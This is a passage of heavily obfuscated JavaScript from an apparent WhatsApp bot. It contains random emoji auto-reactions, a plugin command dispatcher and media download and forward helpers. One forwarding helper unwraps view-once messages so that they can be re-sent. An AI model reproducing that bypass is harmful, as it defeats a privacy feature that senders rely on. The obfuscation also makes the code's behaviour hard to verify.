','💬','🗣','💫','🌟','🌠','🎉','🎊','👏','💥','🔥','💥','🌪','💨','🌫','🌬','🌩','🌨','🌧','🌦','🌥','🌡','🌪','🌫','🌬','🌩','🌨','🌧','🌦','🌥','🌡','🌪','🌫','🌬','🌩','🌨','🌧','🌦','🌥','🌡','🌱','🌿','🍃','🍂','🌻','💐','🌹','🌺','🌸','🌴','🏵','🎀','🏆','🏈','🏉','🎯','🏀','🏊','🏋','🏌','🎲','📚','📖','📜','📝','💭','💬','🗣','💫','🌟','🌠','🎉','🎊','👏','💥','🔥','💥','🌪','💨','🌫','🌬','🌩','🌨','🌧','🌦','🌥','🌡','🌪','🌫','🌬','🌩','🌨','🌧','🌦','🌥','🌡',_0x399299(0x169),'💡','🔦','🔧','🔨','🔩','🔪','🔫','👑','👸','🤴','👹','🤺','🤻','👺','🤼','🤽','🤾','🤿','🦁','🐴','🦊','🐺','🐼','🐾','🐿','🦄','🦅','🦆','🦇','🦈','🐳','🐋','🐟','🐠','🐡','🐙','🐚','🐜','🐝','🐞',_0x399299(0x301),'🦋','🐛','🐌','🐚','🌿','🌸','💐','🌹','🌺','🌻','🌴','🏵','🏰','🏠','🏡','🏢','🏣','🏥','🏦','🏧','🏨','🏩','🏪','🏫','🏬','🏭','🏮','🏯','🚣','🛥','🚂','🚁','🚀','🛸','🛹','🚴','🚲','🛺','🚮','🚯','🚱','🚫','🚽',_0x399299(0x24f),'💣','🔫',_0x399299(0x301),_0x399299(0x317),'💀','👻','🕺','💃','🕴️','👶','👵','👴','👱','👨','👩','👧','👦','👪','👫','👭','👬','👮',_0x3b8d33['vEyqg'],'💼','📊','📈','📉','📊','📝','📚','📰','📱','💻','📻','📺','🎬','📽️','📸','📷',_0x399299(0x169),'💡','🔦','🔧','🔨','🔩','🔪','🔫','👑','👸','🤴','👹','🤺','🤻','👺','🤼','🤽','🤾','🤿','🦁','🐴','🦊','🐺','🐼','🐾','🐿','🦄','🦅','🦆','🦇','🦈','🐳','🐋','🐟','🐠','🐡','🐙','🐚','🐜','🐝','🐞',_0x3b8d33[_0x399299(0x174)],'🦋','🐛','🐌','🐚','🌿','🌸','💐','🌹','🌺','🌻','🌴','🏵','🏰','🐒','🦍','🦧','🐶','🐕','🦮',_0x399299(0x1d6),'🐩','🐺','🦊','🦝','🐱','🐈','🐈‍⬛','🦁','🐯','🐅','🐆','🐴','🐎','🦄','🦓','🦌','🦬','🐮','🐂','🐃','🐄','🐷','🐖','🐗','🐽','🐏','🐑','🐐','🐪','🐫','🦙','🦒','🐘','🦣','🦏','🦛','🐭','🐁','🐀','🐹','🐰','🐇',_0x3b8d33['bchZx'],'🦫','🦔','🦇','🐻',_0x3b8d33[_0x399299(0x151)],'🐨','🐼','🦥','🦦','🦨','🦘','🦡','🐾','🦃','🐔','🐓','🐣','🐤','🐥','🐦','🐧',_0x399299(0x2c0),'🦅','🦆','🦢','🦉','🦤','🪶','🦩','🦚','🦜','🐸','🐊','🐢','🦎','🐍','🐲','🐉','🦕','🦖','🐳','🐋','🐬','🦭','🐟','🐠','😀','😃','😄','😁','😆','😅','🤣','😂','🙂','🙃','😉','😊','😇','🥰','😍','🤩','😘','😗','☺️','😚','😙','🥲','😋','😛','😜','🤪','😝','🤑','🤗','🤭','🤫','🤔','🤐','🤨','😐','😑','😶','😶‍🌫️','😏','😒','🙄','😬',_0x3b8d33['bwNIf'],'🤥','😌','😔','😪','🤤','😴','😷','🤒','🤕','🤢','🤮','🤧','🥵','🥶','🥴','😵',_0x3b8d33['pVBYL'],'🤯','🤠','🥳','🥸','😎','🤓','🧐','😕','😟','🙁','☹️','😮','😯','😲','😳','🥺','😦','😧','😨','😰','😥','😢','😭','😱','😖','😣','😞','😓','😩','😫','🥱','😤','😡','😠','🤬','😈','👿','💀','☠️','💩','🤡','👹','👺','👻','👽','👾','🤖','😺','😸','😹','😻','😼','😽','🙀','😿','😾','🙈','🙉','🙊','💋','💌','💘','💝','💖','💗','💓','💞','💕','💟','❣️','💔',_0x3b8d33['kkNXF'],_0x3b8d33['gONSu'],'❤️','🧡','💛','💚','💙','💜','🤎','🖤','🤍','💯','💢','💥','💫','💦','💨',_0x3b8d33[_0x399299(0x278)],'💣','💬',_0x399299(0x1e9),_0x3b8d33['WskdD'],_0x3b8d33[_0x399299(0x199)],'💭','💤','👋','🤚',_0x399299(0x1dd),'✋','🖖','👌','🤌','🤏','✌️','🤞','🤟','🤘','🤙','👈','👉','👆','🖕','👇','☝️','👍','👎','✊','👊','🤛','🤜','👏','🙌','👐','🤲','🤝','🙏','✍️','💅','🤳','💪','🦾','🦿','🦵','🦶','👂','🦻','👃','🧠','🫀','🫁','🦷','🦴','👀',_0x3b8d33['ZrMxz'],'👅','👄','👶','🧒','👦','👧','🧑','👱','👨','🧔',_0x3b8d33[_0x399299(0x26c)],_0x399299(0x1e2),_0x3b8d33['ohjQn'],_0x399299(0x1be),_0x3b8d33[_0x399299(0x2af)],_0x3b8d33['imeYU'],'👩',_0x3b8d33['XzFkc'],_0x3b8d33['XqHBh'],_0x399299(0x1f3),_0x399299(0x2cb),_0x3b8d33['sLxuJ'],'🧑‍🦳',_0x3b8d33[_0x399299(0x303)],'🧑‍🦲',_0x3b8d33[_0x399299(0x154)],_0x3b8d33['xwPFb'],'🧓','👴','👵','🙍',_0x399299(0x29f),_0x3b8d33['ppaKs'],'🙎',_0x399299(0x2fd),_0x399299(0x2fb),'🙅',_0x3b8d33['KhKea'],_0x3b8d33[_0x399299(0x246)],'🙆',_0x399299(0x1b7),_0x3b8d33[_0x399299(0x25b)],'💁',_0x399299(0x2c2),_0x3b8d33[_0x399299(0x242)],'🙋',_0x3b8d33['ICbYN'],'🙋‍♀️','🧏','🧏‍♂️','🧏‍♀️','🙇',_0x3b8d33[_0x399299(0x2a6)],'🙇‍♀️','🤦',_0x3b8d33['mtiyT'],_0x3b8d33['rUiFl'],'🤷',_0x3b8d33[_0x399299(0x262)],_0x3b8d33['qXvPH'],'🧑‍⚕️',_0x3b8d33['BUhXa'],_0x3b8d33[_0x399299(0x1e8)],_0x3b8d33['PyoqA'],_0x3b8d33[_0x399299(0x220)],_0x3b8d33['xexdj'],_0x3b8d33['oeHIM'],'👨‍🏫','👩‍🏫',_0x399299(0x2b3),_0x3b8d33[_0x399299(0x222)],_0x3b8d33['oNxnp'],_0x3b8d33['rxTlR'],_0x3b8d33['uvSMJ'],'👩‍🌾','🧑‍🍳',_0x3b8d33['IUVBM'],_0x399299(0x1e6),'🧑‍🔧',_0x399299(0x33b),_0x3b8d33['wsGhO'],'🧑‍🏭',_0x3b8d33['ankGM'],_0x3b8d33[_0x399299(0x14f)],_0x3b8d33['ffZmz'],_0x3b8d33[_0x399299(0x2a2)],_0x399299(0x232),'🧑‍🔬',_0x3b8d33[_0x399299(0x2e0)],_0x399299(0x188),_0x3b8d33['EAxzr'],'👨‍💻',_0x399299(0x1ad),_0x399299(0x289),'👨‍🎤',_0x399299(0x170),'🧑‍🎨',_0x3b8d33[_0x399299(0x1ff)],_0x3b8d33[_0x399299(0x1c2)],'🧑‍✈️',_0x3b8d33[_0x399299(0x313)],_0x399299(0x166),_0x399299(0x2c1),'👨‍🚀','👩‍🚀',_0x3b8d33['zvSke'],_0x3b8d33['MKfeE'],'👩‍🚒','👮',_0x399299(0x2bf),_0x3b8d33[_0x399299(0x167)],_0x3b8d33[_0x399299(0x32c)],_0x399299(0x2d4),'🕵️‍♀️','💂',_0x3b8d33['ytyZj'],_0x3b8d33[_0x399299(0x30c)],'🥷','👷',_0x3b8d33[_0x399299(0x252)],'👷‍♀️','🤴','👸','👳',_0x399299(0x2d0),'👳‍♀️','👲','🧕','🤵',_0x399299(0x187),_0x3b8d33['RnESC'],'👰',_0x3b8d33[_0x399299(0x349)],_0x3b8d33[_0x399299(0x1f8)],'🤰','🤱',_0x399299(0x192),_0x3b8d33[_0x399299(0x215)],'🧑‍🍼','👼','🎅','🤶','🧑‍🎄','🦸',_0x399299(0x2f0),_0x3b8d33[_0x399299(0x1ee)],'🦹','🦹‍♂️','🦹‍♀️','🧙',_0x3b8d33[_0x399299(0x1ef)],'🧙‍♀️','🧚',_0x399299(0x24b),_0x3b8d33['zQqYJ'],'🧛',_0x3b8d33['wiQQv'],_0x399299(0x1aa),'🧜',_0x399299(0x337),_0x3b8d33[_0x399299(0x346)],'🧝','🧝‍♂️',_0x3b8d33['artIz'],'🧞',_0x3b8d33[_0x399299(0x28f)],_0x3b8d33[_0x399299(0x273)],'🧟',_0x3b8d33['MtrLD'],_0x3b8d33[_0x399299(0x225)],'💆',_0x3b8d33['sTnxh'],_0x399299(0x1f1),'💇',_0x399299(0x2a1),_0x399299(0x2ad),'🚶',_0x3b8d33['BOVRz'],_0x3b8d33[_0x399299(0x19d)],'🧍',_0x3b8d33[_0x399299(0x2c9)],'🧍‍♀️','🧎',_0x399299(0x17d),_0x3b8d33['tvgwD'],_0x399299(0x306),_0x3b8d33[_0x399299(0x205)],'👩‍🦯',_0x3b8d33[_0x399299(0x2a0)],_0x399299(0x319),'👩‍🦼',_0x3b8d33[_0x399299(0x325)],_0x399299(0x219),_0x3b8d33['JrfDU'],'🏃',_0x399299(0x239),_0x3b8d33['GfNAt'],'💃','🕺','🕴️','👯','👯‍♂️',_0x3b8d33[_0x399299(0x304)],'🧖',_0x3b8d33['VfgCW'],_0x3b8d33[_0x399299(0x334)],'🧗',_0x3b8d33[_0x399299(0x257)],_0x3b8d33[_0x399299(0x1fb)],'🤺','🏇','⛷️','🏂',_0x3b8d33[_0x399299(0x25f)],_0x399299(0x1cf),_0x3b8d33[_0x399299(0x2d7)],'🏄',_0x3b8d33['HIZPT'],_0x3b8d33['VLhzs'],'🚣',_0x399299(0x2e1),'🚣‍♀️','🏊',_0x3b8d33['MpnFi'],'🏊‍♀️','⛹️','⛹️‍♂️',_0x3b8d33[_0x399299(0x2a8)],_0x3b8d33['QZErG'],_0x3b8d33['syNDy'],'🏋️‍♀️','🚴',_0x3b8d33['EJfmP'],'🚴‍♀️','🚵',_0x3b8d33['xEQxx'],_0x3b8d33['nWUBm'],'🤸','🤸‍♂️',_0x3b8d33['GuokK'],'🤼','🤼‍♂️','🤼‍♀️','🤽',_0x399299(0x28d),_0x3b8d33[_0x399299(0x19b)],'🤾','🤾‍♂️','🤾‍♀️','🤹',_0x3b8d33['YyieF'],_0x399299(0x31a),'🧘',_0x3b8d33['wOCMN'],'🧘‍♀️','🛀','🛌',_0x399299(0x2a3),'👭','👫','👬','💏',_0x3b8d33['MZwIm'],'👨‍❤️‍💋‍👨',_0x399299(0x1b3),'💑',_0x399299(0x259),_0x399299(0x155),'👩‍❤️‍👩','👪','👨‍👩‍👦','👨‍👩‍👧',_0x3b8d33[_0x399299(0x316)],'👨‍👩‍👦‍👦','👨‍👩‍👧‍👧','👨‍👨‍👦',_0x3b8d33['jhfuh'],_0x3b8d33[_0x399299(0x1fd)],'👨‍👨‍👦‍👦',_0x3b8d33[_0x399299(0x15c)],_0x3b8d33[_0x399299(0x211)],_0x3b8d33[_0x399299(0x19e)],_0x3b8d33['rDVvc'],_0x399299(0x2a4),'👩‍👩‍👧‍👧',_0x3b8d33[_0x399299(0x19c)],_0x3b8d33['mgXmr'],_0x3b8d33[_0x399299(0x1bf)],'👨‍👧‍👦',_0x3b8d33[_0x399299(0x31d)],'👩‍👦',_0x3b8d33['CzGUZ'],_0x3b8d33['bmLnq'],_0x3b8d33[_0x399299(0x274)],_0x399299(0x16c),_0x399299(0x1ca),'👤','👥','🫂','👣','🦰','🦱','🦳','🦲','🐵'],_0x20f2fd=_0x3d1896[Math[_0x399299(0x1b9)](Math['random']()*_0x3d1896['length'])];_0xde9345[_0x399299(0x258)](_0x20f2fd);}}if(!_0x1e7834&&_0x3b8d33['bOQCp'](_0x74ff0c,_0x2341d2)){if(config['HEART_REACT']===_0x3b8d33['DeZRo']){const _0x50d55a=['💘','💝','💖','💗','💓','💞','💕','❣️','❤️‍🔥',_0x3b8d33['gONSu'],'❤️','🩷','🧡','💛','💚','💙','🩵','💜','🤎','🖤','🩶','🤍'],_0x230616=_0x50d55a[Math['floor'](Math['random']()*_0x50d55a['length'])];_0xde9345[_0x399299(0x258)](_0x230616);}}if(!_0x1e7834&&_0x74ff0c===_0x2341d2){if(_0x3b8d33[_0x399299(0x1f6)](config['HEART_REACT'],_0x3b8d33['DeZRo'])){const _0x1e9805=['💘','💝','💖','💗','💓','💞','💕','❣️','❤️‍🔥',_0x3b8d33['gONSu'],'❤️','🩷','🧡','💛','💚','💙','🩵','💜','🤎','🖤','🩶','🤍'],_0x4d0d0a=_0x1e9805[Math['floor'](Math[_0x399299(0x341)]()*_0x1e9805[_0x399299(0x30a)])];_0xde9345[_0x399299(0x258)](_0x4d0d0a);}}if(!_0x265b90&&config['MODE']===_0x3b8d33[_0x399299(0x2da)])return;if(_0x3b8d33[_0x399299(0x16f)](!_0x265b90,_0x4b75d8)&&config['MODE']==='inbox')return;if(!_0x265b90&&!_0x4b75d8&&config[_0x399299(0x228)]===_0x3b8d33[_0x399299(0x18c)])return;const _0x25939e=_0x3b8d33['fWaqM'](require,_0x3b8d33[_0x399299(0x2e6)]),_0x2bab70=_0x2ac4e5?_0x39ba9c['slice'](0x1)['trim']()['split']('\x20')[0x0]['toLowerCase']():![];if(_0x2ac4e5){const _0x353d74=_0x25939e[_0x399299(0x1eb)][_0x399299(0x2df)](_0xc86b26=>_0xc86b26[_0x399299(0x1ae)]===_0x2bab70)||_0x25939e['commands']['find'](_0x20ea50=>_0x20ea50['alias']&&_0x20ea50['alias'][_0x399299(0x1d1)](_0x2bab70));if(_0x353d74){if(_0x353d74[_0x399299(0x258)])_0x25e2e4['sendMessage'](_0x4e1a46,{'react':{'text':_0x353d74[_0x399299(0x258)],'key':_0xda26d0['key']}});try{_0x353d74[_0x399299(0x2a9)](_0x25e2e4,_0xda26d0,_0xde9345,{'from':_0x4e1a46,'quoted':_0x403f40,'body':_0x39ba9c,'isCmd':_0x2ac4e5,'command':_0x565c84,'args':_0x4ea90f,'q':_0x48f997,'text':_0xb87f7a,'isGroup':_0x4b75d8,'sender':_0x160a16,'senderNumber':_0x74ff0c,'botNumber2':_0x59e01b,'botNumber':_0x2341d2,'pushname':_0x7bfc40,'isMe':_0x46a6b9,'isOwner':_0x265b90,'isCreator':_0x3ea6bd,'groupMetadata':_0x2f6dc2,'groupName':_0x2cfae9,'participants':_0x31409c,'groupAdmins':_0x4414a5,'isBotAdmins':_0x5c2b6e,'isAdmins':_0x1e04f8,'reply':_0x2a14b7});}catch(_0xb1c7fb){console['error']('[PLUGIN\x20ERROR]\x20'+_0xb1c7fb);}}}_0x25939e['commands'][_0x399299(0x20e)](async _0x3a79f0=>{const _0x1bae06=_0x399299;if(_0x39ba9c&&_0x3a79f0['on']===_0x3b8d33[_0x1bae06(0x33a)])_0x3a79f0[_0x1bae06(0x2a9)](_0x25e2e4,_0xda26d0,_0xde9345,{'from':_0x4e1a46,'l':l,'quoted':_0x403f40,'body':_0x39ba9c,'isCmd':_0x2ac4e5,'command':_0x3a79f0,'args':_0x4ea90f,'q':_0x48f997,'text':_0xb87f7a,'isGroup':_0x4b75d8,'sender':_0x160a16,'senderNumber':_0x74ff0c,'botNumber2':_0x59e01b,'botNumber':_0x2341d2,'pushname':_0x7bfc40,'isMe':_0x46a6b9,'isOwner':_0x265b90,'isCreator':_0x3ea6bd,'groupMetadata':_0x2f6dc2,'groupName':_0x2cfae9,'participants':_0x31409c,'groupAdmins':_0x4414a5,'isBotAdmins':_0x5c2b6e,'isAdmins':_0x1e04f8,'reply':_0x2a14b7});else{if(_0xda26d0['q']&&_0x3a79f0['on']===_0x3b8d33['yVYEY'])_0x3a79f0['function'](_0x25e2e4,_0xda26d0,_0xde9345,{'from':_0x4e1a46,'l':l,'quoted':_0x403f40,'body':_0x39ba9c,'isCmd':_0x2ac4e5,'command':_0x3a79f0,'args':_0x4ea90f,'q':_0x48f997,'text':_0xb87f7a,'isGroup':_0x4b75d8,'sender':_0x160a16,'senderNumber':_0x74ff0c,'botNumber2':_0x59e01b,'botNumber':_0x2341d2,'pushname':_0x7bfc40,'isMe':_0x46a6b9,'isOwner':_0x265b90,'isCreator':_0x3ea6bd,'groupMetadata':_0x2f6dc2,'groupName':_0x2cfae9,'participants':_0x31409c,'groupAdmins':_0x4414a5,'isBotAdmins':_0x5c2b6e,'isAdmins':_0x1e04f8,'reply':_0x2a14b7});else{if((_0x3a79f0['on']===_0x3b8d33['dKcuo']||_0x3a79f0['on']===_0x1bae06(0x1ba))&&_0xda26d0['type']===_0x1bae06(0x30e))_0x3a79f0[_0x1bae06(0x2a9)](_0x25e2e4,_0xda26d0,_0xde9345,{'from':_0x4e1a46,'l':l,'quoted':_0x403f40,'body':_0x39ba9c,'isCmd':_0x2ac4e5,'command':_0x3a79f0,'args':_0x4ea90f,'q':_0x48f997,'text':_0xb87f7a,'isGroup':_0x4b75d8,'sender':_0x160a16,'senderNumber':_0x74ff0c,'botNumber2':_0x59e01b,'botNumber':_0x2341d2,'pushname':_0x7bfc40,'isMe':_0x46a6b9,'isOwner':_0x265b90,'isCreator':_0x3ea6bd,'groupMetadata':_0x2f6dc2,'groupName':_0x2cfae9,'participants':_0x31409c,'groupAdmins':_0x4414a5,'isBotAdmins':_0x5c2b6e,'isAdmins':_0x1e04f8,'reply':_0x2a14b7});else _0x3a79f0['on']===_0x1bae06(0x2ce)&&_0xda26d0[_0x1bae06(0x250)]==='stickerMessage'&&_0x3a79f0['function'](_0x25e2e4,_0xda26d0,_0xde9345,{'from':_0x4e1a46,'l':l,'quoted':_0x403f40,'body':_0x39ba9c,'isCmd':_0x2ac4e5,'command':_0x3a79f0,'args':_0x4ea90f,'q':_0x48f997,'text':_0xb87f7a,'isGroup':_0x4b75d8,'sender':_0x160a16,'senderNumber':_0x74ff0c,'botNumber2':_0x59e01b,'botNumber':_0x2341d2,'pushname':_0x7bfc40,'isMe':_0x46a6b9,'isOwner':_0x265b90,'isCreator':_0x3ea6bd,'groupMetadata':_0x2f6dc2,'groupName':_0x2cfae9,'participants':_0x31409c,'groupAdmins':_0x4414a5,'isBotAdmins':_0x5c2b6e,'isAdmins':_0x1e04f8,'reply':_0x2a14b7});}}});}),_0x25e2e4['decodeJid']=_0x3565a3=>{const _0x1247bd=_0x34174a;if(!_0x3565a3)return _0x3565a3;if(/:\d+@/gi[_0x1247bd(0x1e4)](_0x3565a3)){let _0x409d4c=jidDecode(_0x3565a3)||{};return _0x409d4c[_0x1247bd(0x165)]&&_0x409d4c['server']&&_0x3b8d33[_0x1247bd(0x15f)](_0x409d4c['user']+'@',_0x409d4c['server'])||_0x3565a3;}else return _0x3565a3;},_0x25e2e4[_0x34174a(0x25e)]=async(_0x5d471b,_0x16de84,_0x6ea401=![],_0x4a6ff7={})=>{const _0x17ea1b=_0x34174a;let _0xf96b25;if(_0x4a6ff7[_0x17ea1b(0x2b5)]){const _0x16fecf=_0x3b8d33['SJjzU'][_0x17ea1b(0x32f)]('|');let _0x199086=0x0;while(!![]){switch(_0x16fecf[_0x199086++]){case'0':_0xf96b25=Object[_0x17ea1b(0x2ba)](_0x16de84[_0x17ea1b(0x348)]['viewOnceMessage'][_0x17ea1b(0x348)])[0x0];continue;case'1':delete(_0x16de84['message']&&_0x16de84[_0x17ea1b(0x348)]['ignore']?_0x16de84[_0x17ea1b(0x348)][_0x17ea1b(0x2bd)]:_0x16de84[_0x17ea1b(0x348)]||undefined);continue;case'2':_0x16de84[_0x17ea1b(0x348)]={..._0x16de84['message']['viewOnceMessage']['message']};continue;case'3':_0x16de84[_0x17ea1b(0x348)]=_0x16de84[_0x17ea1b(0x348)]&&_0x16de84[_0x17ea1b(0x348)]['ephemeralMessage']&&_0x16de84['message']['ephemeralMessage'][_0x17ea1b(0x348)]?_0x16de84['message']['ephemeralMessage'][_0x17ea1b(0x348)]:_0x16de84[_0x17ea1b(0x348)]||undefined;continue;case'4':delete _0x16de84[_0x17ea1b(0x348)]['viewOnceMessage']['message'][_0xf96b25][_0x17ea1b(0x284)];continue;}break;}}let _0x4fff06=Object['keys'](_0x16de84['message'])[0x0],_0x313117=await _0x3b8d33[_0x17ea1b(0x2f8)](generateForwardMessageContent,_0x16de84,_0x6ea401),_0x37f03f=Object['keys'](_0x313117)[0x0],_0x136254={};if(_0x3b8d33['rXJMt'](_0x4fff06,_0x3b8d33['krOJE']))_0x136254=_0x16de84['message'][_0x4fff06]['contextInfo'];_0x313117[_0x37f03f][_0x17ea1b(0x345)]={..._0x136254,..._0x313117[_0x37f03f]['contextInfo']};const _0x5ec885=await _0x3b8d33[_0x17ea1b(0x32a)](generateWAMessageFromContent,_0x5d471b,_0x313117,_0x4a6ff7?{..._0x313117[_0x37f03f],..._0x4a6ff7,..._0x4a6ff7['contextInfo']?{'contextInfo':{..._0x313117[_0x37f03f]['contextInfo'],..._0x4a6ff7[_0x17ea1b(0x345)]}}:{}}:{});return await _0x25e2e4['relayMessage'](_0x5d471b,_0x5ec885[_0x17ea1b(0x348)],{'messageId':_0x5ec885[_0x17ea1b(0x2e7)]['id']}),_0x5ec885;},_0x25e2e4['downloadAndSaveMediaMessage']=async(_0x23726c,_0x410faa,_0x5d5f71=!![])=>{const _0x38725b=_0x34174a;let _0x41c158=_0x23726c['msg']?_0x23726c['msg']:_0x23726c,_0x599606=(_0x23726c[_0x38725b(0x323)]||_0x23726c)['mimetype']||'',_0x27f42f=_0x23726c['mtype']?_0x23726c['mtype']['replace'](/Message/gi,''):_0x599606['split']('/')[0x0];const _0xb1184d=await _0x3b8d33['MSJvY'](downloadContentFromMessage,_0x41c158,_0x27f42f);let _0x3684e7=Buffer['from']([]);for await(const _0x8fa41d of _0xb1184d){_0x3684e7=Buffer['concat']([_0x3684e7,_0x8fa41d]);}let _0x69e8df=await FileType[_0x38725b(0x1a0)](_0x3684e7);return trueFileName=_0x5d5f71?_0x3b8d33['dISyC'](_0x410faa,'.')+_0x69e8df[_0x38725b(0x336)]:_0x410faa,await fs[_0x38725b(0x333)](trueFileName,_0x3684e7),trueFileName;},_0x25e2e4['downloadMediaMessage']=async _0x4742ce=>{const _0x457c3b=_0x34174a;let _0x42883a=(_0x4742ce['msg']||_0x4742ce)['mimetype']||'',_0x570f39=_0x4742ce[_0x457c3b(0x2e4)]?_0x4742ce[_0x457c3b(0x2e4)][_0x457c3b(0x1f5)](/Message/gi,''):_0x42883a['split']('/')[0x0];const _0x53b82a=await downloadContentFromMessage(_0x4742ce,_0x570f39);let _0x56d0b7=Buffer[_0x457c3b(0x173)]([]);for await(const _0x4f9290 of _0x53b82a){_0x56d0b7=Buffer['concat']([_0x56d0b7,_0x4f9290]);}return _0x56d0b7;},_0x25e2e4[_0x34174a(0x255)]=async(_0x3ed1bc,_0x473e73,_0x1d5942,_0x8380cd,_0x15fc2a={})=>{const _0x1f5eec=_0x34174a;let _0x4aadcf='',_0x3e7d9e=await axios[_0x1f5eec(0x1ce)](_0x473e73);_0x4aadcf=_0x3e7d9e['headers'][_0x1f5eec(0x1d2)];if(_0x3b8d33[_0x1f5eec(0x312)](_0x4aadcf[_0x1f5eec(0x32f)]('/')[0x1],_0x3b8d33[_0x1f5eec(0x1b2)]))return _0x25e2e4[_0x1f5eec(0x21f)](_0x3ed1bc,{'video':await getBuffer(_0x473e73),'caption':_0x1d5942,'gifPlayback':!![],..._0x15fc2a},{'quoted':_0x8380cd,..._0x15fc2a});let _0x28ca60=_0x4aadcf['split']('/')[0x0]+_0x3b8d33['fgoQw'];if(_0x4aadcf===_0x1f5eec(0x287))return _0x25e2e4['sendMessage'](_0x3ed1bc,{'document':await _0x3b8d33['fWaqM'](getBuffer,_0x473e73),'mimetype':_0x3b8d33[_0x1f5eec(0x330)],'caption':_0x1d5942,..._0x15fc2a},{'quoted':_0x8380cd,..._0x15fc2a});if(_0x3b8d33['kYyNw'](_0x4aadcf['split']('/')[0x0],_0x1f5eec(0x236)))return _0x25e2e4['sendMessage'](_0x3ed1bc,{'image':await getBuffer(_0x473e73),'caption':_0x1d5942,..._0x15fc2a},{'quoted':_0x8380cd,..._0x15fc2a});if(_0x3b8d33[_0x1f5eec(0x332)](_0x4aadcf['split']('/')[0x0],_0x3b8d33['OtwOx']))return _0x25e2e4['sendMessage'](_0x3ed1bc,{'video':await getBuffer(_0x473e73),'caption':_0x1d5942,'mimetype':_0x3b8d33[_0x1f5eec(0x22b)],..._0x15fc2a},{'quoted':_0x8380cd,..._0x15fc2a});if(_0x3b8d33[_0x1f5eec(0x186)](_0x4aadcf['split']('/')[0x0],_0x3b8d33[_0x1f5eec(0x295)]))return _0x25e2e4['sendMessage'](_0x3ed1bc,{'audio':await getBuffer(_0x473e73),'caption':_0x1d5942,'mimetype':_0x3b8d33['IIbJR'],..._0x15fc2a},{'quoted':_0x8380cd,..._0x15fc2a});},_0x25e2e4['cMod']=(_0x54ade1,_0x4b743f,_0x1fc720='',_0x2b66de=_0x25e2e4[_0x34174a(0x165)]['id'],_0x8b108c={})=>{const _0x4e9c22=_0x34174a;let _0x4a268f=Object['keys'](_0x4b743f['message'])[0x0],_0x372ad8=_0x3b8d33['sDoRU'](_0x4a268f,_0x3b8d33[_0x4e9c22(0x256)]);_0x372ad8&&(_0x4a268f=Object[_0x4e9c22(0x2ba)](_0x4b743f[_0x4e9c22(0x348)]['ephemeralMessage']['message'])[0x0]);let _0x5fc531=_0x372ad8?_0x4b743f[_0x4e9c22(0x348)][_0x4e9c22(0x1e1)][_0x4e9c22(0x348)]:_0x4b743f['message'],_0x48b23b=_0x5fc531[_0x4a268f];if(typeof _0x48b23b===_0x3b8d33[_0x4e9c22(0x31c)])_0x5fc531[_0x4a268f]=_0x1fc720||_0x48b23b;else{if(_0x48b23b[_0x4e9c22(0x2d5)])_0x48b23b[_0x4e9c22(0x2d5)]=_0x1fc720||_0x48b23b['caption'];else{if(_0x48b23b[_0x4e9c22(0x1c9)])_0x48b23b['text']=_0x1fc720||_0x48b23b['text'];}}if(typeof _0x48b23b!==_0x3b8d33['xuveO'])_0x5fc531[_0x4a268f]={..._0x48b23b,..._0x8b108c};if(_0x4b743f[_0x4e9c22(0x2e7)]['participant'])_0x2b66de=_0x4b743f[_0x4e9c22(0x2e7)][_0x4e9c22(0x281)]=_0x2b66de||_0x4b743f[_0x4e9c22(0x2e7)][_0x4e9c22(0x281)];else{if(_0x4b743f[_0x4e9c22(0x2e7)]['participant'])_0x2b66de=_0x4b743f[_0x4e9c22(0x2e7)][_0x4e9c22(0x281)]=_0x2b66de||_0x4b743f['key']['participant'];}if(_0x4b743f[_0x4e9c22(0x2e7)][_0x4e9c22(0x268)][_0x4e9c22(0x1d1)]('@s.whatsapp.net'))_0x2b66de=_0x2b66de||_0x4b743f['key']['remoteJid'];else{if(_0x4b743f[_0x4e9c22(0x2e7)][_0x4e9c22(0x268)][_0x4e9c22(0x1d1)]('@broadcast'))_0x2b66de=_0x2b66de||_0x4b743f['key'][_0x4e9c22(0x268)];}return _0x4b743f[_0x4e9c22(0x2e7)][_0x4e9c22(0x268)]=_0x54ade1,_0x4b743f[_0x4e9c22(0x2e7)][_0x4e9c22(0x29d)]=_0x2b66de===_0x25e2e4[_0x4e9c22(0x165)]['id'],proto[_0x4e9c22(0x318)][_0x4e9c22(0x194)](_0x4b743f);},_0x25e2e4[_0x34174a(0x296)]=async(_0x4ba6e5,_0x165ddf)=>{const _0x5ad502=_0x34174a;let _0x2c2978,_0x1e3d81=Buffer['isBuffer'](_0x4ba6e5)?_0x4ba6e5:/^data:.*?\/.*?;base64,/i['test'](_0x4ba6e5)?Buffer['from'](_0x4ba6e5[_0x5ad502(0x32f)]`,`[0x1],_0x5ad502(0x1dc)):/^https?:\/\//[_0x5ad502(0x1e4)](_0x4ba6e5)?await(_0x2c2978=await getBuffer(_0x4ba6e5)):fs[_0x5ad502(0x265)](_0x4ba6e5)?(_0x1cbf91=_0x4ba6e5,fs['readFileSync'](_0x4ba6e5)):typeof _0x4ba6e5===_0x5ad502(0x1a4)?_0x4ba6e5:Buffer[_0x5ad502(0x1a8)](0x0),_0x40cae6=await FileType['fromBuffer'](_0x1e3d81)||{'mime':_0x5ad502(0x1c3),'ext':_0x3b8d33['YxpRi']},_0x1cbf91=path[_0x5ad502(0x29e)](__filename,_0x3b8d33['RNaMb'](_0x3b8d33['CVXnU'](__dirname+_0x3b8d33['sekqk'](new Date(),0x1),'.'),_0x40cae6[_0x5ad502(0x336)]));if(_0x1e3d81&&_0x165ddf)fs[_0x5ad502(0x20f)][_0x5ad502(0x1ec)](_0x1cbf91,_0x1e3d81);return{'res':_0x2c2978,'filename':_0x1cbf91,'size':await getSizeMedia(_0x1e3d81),..._0x40cae6,'data':_0x1e3d81};},_0x25e2e4[_0x34174a(0x1a7)]=async(_0x5963b5,_0x435e74,_0x3fa647,_0x24f8aa={},_0x1377ab={})=>{const _0x4cfacb=_0x34174a;let _0x3fc187=await _0x25e2e4[_0x4cfacb(0x296)](_0x435e74,!![]),{filename:_0x51518b,size:_0x26c94b,ext:_0x3cc224,mime:_0x45e110,data:_0x330d18}=_0x3fc187,_0x21e260='',_0x284c2b=_0x45e110,_0x1b9bd2=_0x51518b;if(_0x1377ab['asDocument'])_0x21e260=_0x4cfacb(0x2c3);if(_0x1377ab['asSticker']||/webp/[_0x4cfacb(0x1e4)](_0x45e110)){let {writeExif:_0x162d62}=_0x3b8d33[_0x4cfacb(0x176)](require,_0x4cfacb(0x1f7)),_0x356152={'mimetype':_0x45e110,'data':_0x330d18};_0x1b9bd2=await 